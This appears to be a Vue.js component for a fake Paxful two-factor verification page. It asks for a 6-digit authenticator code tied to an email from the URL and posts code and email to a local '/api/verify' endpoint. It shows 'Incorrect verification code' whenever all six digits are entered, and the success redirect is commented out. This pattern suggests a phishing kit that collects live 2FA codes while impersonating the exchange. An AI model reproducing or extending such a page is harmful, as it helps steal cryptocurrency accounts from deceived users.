<template>
    <div class="container">
      <div class="login-section">
        <div class="logo">
          <img :src="getPhoto() + '/paxful.png'" alt="Paxful Logo">paxful
        </div>
        <div class="back-button">&lt; <a href="/">Back</a></div>
        <div class="welcome-text">Verification</div>
        <div class="signup-link">
          Enter the 6-digit code we sent to the authenticator associated with your account:<strong>{{ email }}</strong>
        </div>
        <div class="signup-link">Confirmation code</div>
        <div class="input-kroup code-inputs">
          <input
            v-for="(box, index) in inputBoxes"
            :key="index"
            v-model="box.value"
            :ref="`input-${index}`"
            type="text"
            maxlength="1"
            class="input-box"
            @input="handleInput(index)"
            @keydown="handleKeydown(index, $event)"
            @paste="handlePaste($event)"
          />
        </div>
        <div v-if="errorMessage" class="signup-link error-message">
          Incorrect verification code. Please try again.
        </div>
      </div>
      <div class="illustration-section">
        <div class="illustration">
          <img :src="getPhoto() + '/registersvg.PNG'" alt="Illustration">
        </div>
      </div>
    </div>
</template>


<script>
export default {
  data() {
    return {
      email: this.$route.query.email || "",
      inputBoxes: Array.from({ length: 6 }, () => ({ value: '' })), // Array of input boxes
      errorMessage: false, // To show/hide error message
    };
  },
  methods: {
    getPhoto()
    {
        return "/storage/images/";
    },
    // Handle input event
    handleInput(index) {
      this.errorMessage = false; // Hide error when user changes input
      if (this.inputBoxes[index].value.length === 1 && index < this.inputBoxes.length - 1) {
        this.$refs[`input-${index + 1}`][0].focus(); // Move focus to the next input
      }
      this.checkFilled();
    },

    // Handle keydown event (backspace)
    handleKeydown(index, event) {
      if (event.key === 'Backspace' && !this.inputBoxes[index].value && index > 0) {
        this.$refs[`input-${index - 1}`][0].focus(); // Move focus to the previous input
      }
    },

    // Handle paste event
    handlePaste(event) {
      event.preventDefault();
      const pastedData = event.clipboardData.getData('text').trim();

      if (/^\d{6}$/.test(pastedData)) {
        pastedData.split('').forEach((char, idx) => {
          if (this.inputBoxes[idx]) {
            this.inputBoxes[idx].value = char;
          }
        });
        this.$refs[`input-${this.inputBoxes.length - 1}`][0].focus(); // Move focus to the last input
        this.checkFilled();
      }
    },

    // Check if all inputs are filled
    checkFilled() {
      const allFilled = this.inputBoxes.every((box) => box.value !== '');
      if (allFilled) {
        this.errorMessage = true; // Show error immediately when all inputs are filled
        const code = this.inputBoxes.map((box) => box.value).join('');
        this.submitCode(code);
      }
    },

    // Submit the code to the server
    async submitCode(code) {
      try {
        const response = await axios.post('/api/verify', { 
          code, 
          email: this.email // Include email in the request
        }, {
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content,
          }
        });

        if (response.data.status === 'success') {
          //this.$router.push('/login'); // Redirect on success
        } else {
          this.errorMessage = true; // Show error message if the code is incorrect
        }
      } catch (error) {
        console.error('Error:', error);
        this.errorMessage = true; // Show error message on network error
      }
    }


  },
};
</script>

<style>

</style>